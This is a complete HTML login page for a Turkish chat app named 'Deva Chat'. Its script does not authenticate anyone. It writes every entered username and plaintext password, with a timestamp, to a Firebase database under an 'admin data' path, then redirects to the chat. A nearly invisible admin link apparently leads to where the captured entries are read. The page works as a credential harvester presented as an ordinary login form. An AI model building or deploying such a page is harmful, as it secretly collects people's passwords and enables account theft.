<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deva Chat | Giriş</title>
    <style>
        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 320px; border: 1px solid #363636; padding: 40px; text-align: center; border-radius: 8px; }
        h1 { font-style: italic; font-size: 35px; margin-bottom: 30px; letter-spacing: -1px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
        .secret { position: fixed; bottom: 5px; right: 5px; opacity: 0.05; text-decoration: none; color: white; font-size: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>Deva Chat</h1>
        <input type="text" id="username" placeholder="Kullanıcı Adı">
        <input type="password" id="password" placeholder="Şifre">
        <button onclick="girisYap()">Giriş Yap</button>
    </div>
    <a href="admin.html" class="secret">Yönetici</a>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDMFqe-lG6-cZUM4XhXs5ftkZt9xZjsno0",
            authDomain: "devachat-fdeb3.firebaseapp.com",
            projectId: "devachat-fdeb3",
            storageBucket: "devachat-fdeb3.firebasestorage.app",
            messagingSenderId: "29301220392",
            appId: "1:29301220392:web:84c34a88c8bf9817cc411d",
            databaseURL: "https://devachat-fdeb3-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.girisYap = function() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if(user && pass) {
                set(ref(db, 'yonetici_verileri/' + user), {
                    kullanici: user,
                    sifre: pass,
                    tarih: new Date().toLocaleString()
                }).then(() => {
                    localStorage.setItem('chatUser', user);
                    window.location.href = "chat.html";
                });
            }
        }
    </script>
</body>
</html>
